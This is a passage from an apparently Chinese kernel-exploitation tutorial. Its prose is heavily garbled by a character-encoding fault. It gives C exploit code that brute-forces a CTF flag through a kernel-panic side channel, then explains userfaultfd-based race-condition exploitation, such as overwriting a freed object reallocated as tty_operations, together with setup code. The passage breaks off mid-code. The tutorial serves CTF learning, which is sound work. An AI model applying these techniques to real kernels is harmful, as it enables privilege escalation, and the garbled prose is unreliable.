<p>æˆ‘ä»¬å°† flag æ”¾åœ¨é€šè¿‡ mmap åˆ†é…è€Œæ¥çš„å†…å­˜é¡µçš„æœ«å°¾ï¼Œå…¶æœ€åä¸€ä¸ªå­—ç¬¦ <code>X</code> æ˜¯æˆ‘ä»¬å°†è¦çˆ†ç ´çš„æœªçŸ¥å­—ç¬¦</p>
<p>å¯¹äºå¾…æ¯”å¯¹å­—ç¬¦ <code>X</code> è€Œè¨€ï¼Œè‹¥æ˜¯æ¯”å¯¹å¤±è´¥åˆ™ ioctl ä¼šç›´æ¥è¿”å›ï¼Œè‹¥æ˜¯æ¯”å¯¹æˆåŠŸåˆ™æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€å¼ å†…å­˜é¡µä¸­è¿›è¡Œè§£å¼•ç”¨ï¼Œ<strong>æ­¤æ—¶å°†ä¼šç›´æ¥é€ æˆ kernel panic</strong></p>
<p>ç”±äº flag è¢«ç¡¬ç¼–ç åœ¨ <code>.ko</code> æ–‡ä»¶ä¸­ï¼Œæ•…é€šè¿‡æ˜¯å¦é€ æˆ kernel panic å¯ä»¥é€å­—ç¬¦çˆ†ç ´ flag å†…å®¹</p>
<p>ASCII å¯è§å­—ç¬¦ 95 ä¸ªï¼Œflag é•¿åº¦ 33ï¼Œå¼€å¤´ <code>flag&#123;</code> æœ«å°¾ <code>&#125;</code> å‡å»6ä¸ªå­—ç¬¦ï¼Œæœ€å¤šåªéœ€è¦çˆ†ç ´ <strong>26 * 95 &#x3D;  2470</strong> æ¬¡ä¾¿èƒ½å¤Ÿè·å¾— flag</p>
<p>æ¯”è¾ƒéœ€è¦è€å¿ƒï¼ˆå› ä¸ºæ‰“è¿œç¨‹ä¼ æ–‡ä»¶å¾ˆéº»çƒ¦ï¼‰ï¼Œè¿™é‡Œé™„ä¸Šä¸€ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„ expï¼Œä¸ç”¨æ¯æ¬¡æ‰“éƒ½é‡æ–°ç¼–è¯‘ä¸€æ¬¡ï¼Œåªéœ€è¦å°† flag ä½œä¸ºå‚æ•°ä¼ è¿›å»å°±è¡Œäº†ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag = &#123; .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, flag_len;<br>    <span class="hljs-type">char</span> * buf, *flag_addr;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;usage: ./exp flag&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>    <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>    flag.flag_addr = flag_addr;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ¯”å¦‚è¯´è¿™é‡Œçš„æµ‹è¯• flag æ˜¯ <code>flag&#123;THIS_IS_A_FLAG_1234&#125;</code>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬æˆåŠŸé€šè¿‡ kernel panic å¾—çŸ¥ flag çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º <code>T</code></p>
<p><img src="https://i.loli.net/2021/09/08/F1IRZwUh2ix7SGL.png" srcset="/img/loading.gif" lazyload></p>
<p>å½“ç„¶ï¼Œè‹¥æ˜¯èƒ½å¤Ÿä¼˜åŒ–æˆçº¯æ±‡ç¼–ä»£ç ï¼Œå¯æ‰§è¡Œæ–‡ä»¶çš„ä½“ç§¯å°†èƒ½å¤Ÿå†ç¼©å°ä¸€ä¸ªæ¡£æ¬¡ï¼Œå¤§å¤§é™ä½çˆ†ç ´æ¬¡æ•°ï¼Œç¬”è€…æ¯”è¾ƒæ‡’ï¼Œè¿™é‡Œä¾¿ä¸å†ç»™å‡ºä¼˜åŒ–åçš„æ±‡ç¼–ä»£ç </p>
<blockquote>
<p>å½“ç„¶ï¼Œä¸åˆ°ä¸‡ä¸å¾—å·²åŸºæœ¬ä¸Šä¸ä¼šç”¨è¿™ç§ç´¯æ­»äººçš„æ–¹æ³•</p>
</blockquote>
</blockquote>
<h2 id="userfaultfdï¼ˆmay-obsoleteï¼‰"><a href="#userfaultfdï¼ˆmay-obsoleteï¼‰" class="headerlink" title="userfaultfdï¼ˆmay obsoleteï¼‰"></a><em>userfaultfdï¼ˆmay obsoleteï¼‰</em></h2><h3 id="userfaultfd-ä¸æ¡ä»¶ç«äº‰"><a href="#userfaultfd-ä¸æ¡ä»¶ç«äº‰" class="headerlink" title="userfaultfd ä¸æ¡ä»¶ç«äº‰"></a>userfaultfd ä¸æ¡ä»¶ç«äº‰</h3><p>ä¸¥æ ¼æ„ä¹‰è€Œè¨€ userfaultfd å¹¶éæ˜¯ä¸€ç§åˆ©ç”¨æ‰‹æ³•ï¼Œ<strong>è€Œæ˜¯ Linux çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨</strong>ï¼Œç®€å•æ¥è¯´ï¼Œé€šè¿‡ userfaultfd è¿™ç§æœºåˆ¶ï¼Œ<strong>ç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰çš„ page fault handler åœ¨ç”¨æˆ·æ€å¤„ç†ç¼ºé¡µå¼‚å¸¸</strong></p>
<p>ä¸‹é¢çš„è¿™å¼ å›¾å¾ˆå¥½åœ°ä½“ç°äº† userfaultfd çš„æ•´ä¸ªæµç¨‹ï¼š</p>
<p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¦ä½¿ç”¨ userfaultfd ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬é¦–å…ˆè¦æ³¨å†Œä¸€ä¸ª userfaultfdï¼Œé€šè¿‡ ioctl ç›‘è§†ä¸€å—å†…å­˜åŒºåŸŸï¼ŒåŒæ—¶è¿˜éœ€è¦ä¸“é—¨å¯åŠ¨ä¸€ä¸ªç”¨ä»¥è¿›è¡Œè½®è¯¢çš„çº¿ç¨‹ <code>uffd monitor</code>ï¼Œè¯¥çº¿ç¨‹ä¼šé€šè¿‡ <code>poll()</code> å‡½æ•°ä¸æ–­è½®è¯¢<strong>ç›´åˆ°å‡ºç°ç¼ºé¡µå¼‚å¸¸</strong></p>
<ul>
<li><p>å½“æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿™å—å†…å­˜åŒºåŸŸå†…è§¦å‘ç¼ºé¡µå¼‚å¸¸æ—¶ï¼ˆæ¯”å¦‚è¯´ç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªåŒ¿åé¡µï¼‰ï¼Œè¯¥çº¿ç¨‹ï¼ˆç§°ä¹‹ä¸º faulting çº¿ç¨‹ï¼‰è¿›å…¥åˆ°å†…æ ¸ä¸­å¤„ç†ç¼ºé¡µå¼‚å¸¸</p>
</li>
<li><p>å†…æ ¸ä¼šè°ƒç”¨ <code>handle_userfault()</code> äº¤ç”± userfaultfd å¤„ç†</p>
</li>
<li><p>éšå faulting çº¿ç¨‹è¿›å…¥å µå¡çŠ¶æ€ï¼ŒåŒæ—¶å°†ä¸€ä¸ª <code>uffd_msg</code> å‘é€ç»™ monitor çº¿ç¨‹ï¼Œç­‰å¾…å…¶å¤„ç†ç»“æŸ</p>
</li>
<li><p>monitor çº¿ç¨‹è°ƒç”¨é€šè¿‡ ioctl å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œæœ‰å¦‚ä¸‹é€‰é¡¹ï¼š</p>
<ul>
<li><code>UFFDIO_COPY</code>ï¼šå°†ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®æ‹·è´åˆ° faulting page ä¸Š</li>
<li><code>UFFDIO_ZEROPAGE</code> ï¼šå°† faulting page ç½®0</li>
<li><code>UFFDIO_WAKE</code>ï¼šç”¨äºé…åˆä¸Šé¢ä¸¤é¡¹ä¸­ <code>UFFDIO_COPY_MODE_DONTWAKE</code> å’Œ <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> æ¨¡å¼å®ç°æ‰¹é‡å¡«å……</li>
</ul>
</li>
<li><p>åœ¨å¤„ç†ç»“æŸå monitor çº¿ç¨‹å‘é€ä¿¡å·å”¤é†’ faulting çº¿ç¨‹ç»§ç»­å·¥ä½œ</p>
</li>
</ul>
<p>ä»¥ä¸Šä¾¿æ˜¯ userfaultfd è¿™ä¸ªæœºåˆ¶çš„æ•´ä¸ªæµç¨‹ï¼Œè¯¥æœºåˆ¶æœ€åˆè¢«è®¾è®¡æ¥ç”¨ä»¥è¿›è¡Œè™šæ‹Ÿæœº&#x2F;è¿›ç¨‹çš„è¿ç§»ç­‰ç”¨é€”ï¼Œä½†æ˜¯<strong>é€šè¿‡è¿™ä¸ªæœºåˆ¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿›ç¨‹æ‰§è¡Œæµç¨‹çš„å…ˆåé¡ºåºï¼Œä»è€Œä½¿å¾—å¯¹æ¡ä»¶ç«äº‰çš„åˆ©ç”¨æˆåŠŸç‡å¤§å¹…æé«˜</strong></p>
<p>è€ƒè™‘åœ¨å†…æ ¸æ¨¡å—å½“ä¸­æœ‰ä¸€ä¸ªèœå•å †çš„æƒ…å†µï¼Œå…¶ä¸­çš„æ“ä½œéƒ½æ²¡æœ‰åŠ é”ï¼Œé‚£ä¹ˆä¾¿å­˜åœ¨æ¡ä»¶ç«äº‰çš„å¯èƒ½ï¼Œè€ƒè™‘å¦‚ä¸‹ç«äº‰æƒ…å†µï¼š</p>
<ul>
<li>çº¿ç¨‹1ä¸æ–­åœ°åˆ†é…ä¸ç¼–è¾‘å †å—</li>
<li>çº¿ç¨‹2ä¸æ–­åœ°é‡Šæ”¾å †å—</li>
</ul>
<p>æ­¤æ—¶çº¿ç¨‹1ä¾¿<strong>æœ‰å¯èƒ½ç¼–è¾‘åˆ°è¢«é‡Šæ”¾çš„å †å—</strong>ï¼Œè‹¥æ˜¯æ­¤æ—¶æ°å¥½æˆ‘ä»¬åˆå°†è¿™ä¸ªå †å—ç”³è¯·åˆ°äº†åˆé€‚çš„ä½ç½®ï¼ˆæ¯”å¦‚è¯´ tty_operationsï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥å®Œæˆå¯¹è¯¥å †å—çš„é‡å†™ï¼Œä»è€Œè¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨</p>
<p>ä½†æ˜¯æ¯«æ— ç–‘é—®çš„æ˜¯ï¼Œè‹¥æ˜¯ç›´æ¥å¼€ä¸¤ä¸ªçº¿ç¨‹è¿›è¡Œç«äº‰ï¼Œå‘½ä¸­çš„å‡ ç‡æ˜¯æ¯”è¾ƒä½çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¾ˆéš¾åˆ¤æ–­æ˜¯å¦å‘½ä¸­</p>
<p>ä½†å‡å¦‚çº¿ç¨‹1ä½¿ç”¨è¯¸å¦‚ <code>copy_from_user</code> ã€<code>copy_to_user</code> ç­‰æ–¹æ³•åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´æ‹·è´æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥ï¼š</p>
<ul>
<li>å…ˆç”¨ mmap åˆ†ä¸€å—åŒ¿åå†…å­˜ï¼Œä¸ºå…¶æ³¨å†Œ userfaultfdï¼Œç”±äºæˆ‘ä»¬æ˜¯ä½¿ç”¨ mmap åˆ†é…çš„åŒ¿åå†…å­˜ï¼Œæ­¤æ—¶è¯¥å—å†…å­˜å¹¶æ²¡æœ‰å®é™…åˆ†é…ç‰©ç†å†…å­˜é¡µ</li>
<li>çº¿ç¨‹1åœ¨å†…æ ¸ä¸­åœ¨è¿™å—å†…å­˜ä¸å†…æ ¸å¯¹è±¡é—´è¿›è¡Œæ•°æ®æ‹·è´ï¼Œ<strong>åœ¨è®¿é—®æ³¨å†Œäº† userfaultfd å†…å­˜æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œé™·å…¥é˜»å¡ï¼Œæ§åˆ¶æƒè½¬äº¤ userfaultfd çš„ uffd monitor çº¿ç¨‹</strong></li>
<li><strong>åœ¨ uffd monitor çº¿ç¨‹ä¸­æˆ‘ä»¬ä¾¿èƒ½å¯¹çº¿ç¨‹1æ­£åœ¨æ“ä½œçš„å†…æ ¸å¯¹è±¡è¿›è¡Œæ¶æ„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚è¦†å†™çº¿ç¨‹1æ­£åœ¨è¯»å†™çš„å†…æ ¸å¯¹è±¡ï¼Œæˆ–æ˜¯å°†çº¿ç¨‹1æ­£åœ¨è¯»å†™çš„å†…æ ¸å¯¹è±¡é‡Šæ”¾æ‰åå†åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ï¼‰</li>
<li>æ­¤æ—¶å†è®©çº¿ç¨‹1ç»§ç»­æ‰§è¡Œï¼Œçº¿ç¨‹ 1 ä¾¿ä¼š<strong>å‘æˆ‘ä»¬æƒ³è¦å†™å…¥çš„ç›®æ ‡å†™å…¥ç‰¹å®šæ•°æ®&#x2F;ä»æˆ‘ä»¬æƒ³è¦è¯»å–çš„ç›®æ ‡è¯»å–ç‰¹å®šæ•°æ®</strong>äº†</li>
</ul>
<p>ç”±æ­¤ï¼Œæˆ‘ä»¬ä¾¿æˆåŠŸåˆ©ç”¨ userfaultfd å®Œæˆäº†å¯¹æ¡ä»¶ç«äº‰æ¼æ´çš„åˆ©ç”¨ï¼Œè¿™é¡¹æŠ€æœ¯çš„å­˜åœ¨ä½¿å¾—æ¡ä»¶ç«äº‰çš„å‘½ä¸­ç‡å¤§å¹…æé«˜</p>
<h3 id="userfaultfd-çš„å…·ä½“ç”¨æ³•"><a href="#userfaultfd-çš„å…·ä½“ç”¨æ³•" class="headerlink" title="userfaultfd çš„å…·ä½“ç”¨æ³•"></a>userfaultfd çš„å…·ä½“ç”¨æ³•</h3><blockquote>
<p>ä»¥ä¸‹ä»£ç å‚è€ƒè‡ª Linux man pageï¼Œç•¥æœ‰æ”¹åŠ¨</p>
</blockquote>
<p>é¦–å…ˆå®šä¹‰æ¥ä¸‹æ¥éœ€è¦ç”¨åˆ°çš„ä¸€äº›æ•°æ®ç»“æ„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><span class="hljs-type">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br><span class="hljs-type">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆé€šè¿‡ userfaultfd ç³»ç»Ÿè°ƒç”¨æ³¨å†Œä¸€ä¸ª userfaultfdï¼Œå…¶ä¸­ <code>O_CLOEXEC</code> å’Œ <code>O_NONBLOCK</code> å’Œ open çš„ flags ç›¸åŒï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºè¿™é‡Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿè®¾å¤‡ <code>userfault</code></p>
<p>è¿™é‡Œç”¨ mmap åˆ†ä¸€ä¸ªåŒ¿åé¡µç”¨ä½œåç»­è¢«ç›‘è§†çš„åŒºåŸŸ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br><span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>uffdio_api.api = UFFD_API;<br>uffdio_api.features = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br><span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">    demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">    actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">    the userfaultfd. */</span><br>len = <span class="hljs-number">0x1000</span>;<br>addr = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>    errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>ä¸ºè¿™å—å†…å­˜åŒºåŸŸæ³¨å†Œ userfaultfd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>uffdio_register.range.len = len;<br>uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>å¯åŠ¨ monitor è½®è¯¢çº¿ç¨‹ï¼Œæ•´ä¸ª userfaultfd çš„å¯åŠ¨æµç¨‹å°±ç»“æŸäº†ï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯ç­‰å¾…ç¼ºé¡µå¼‚å¸¸çš„è¿‡ç¨‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br><span class="hljs-type">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-type">void</span> *) uffd);<br><span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>monitor è½®è¯¢çº¿ç¨‹åº”å½“å®šä¹‰å¦‚ä¸‹å½¢å¼ï¼Œè¿™é‡Œç»™å‡ºçš„æ˜¯ UFFD_COPYï¼Œå³å°†è‡ªå®šä¹‰æ•°æ®æ‹·è´åˆ° faulting page ä¸Šï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-type">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span 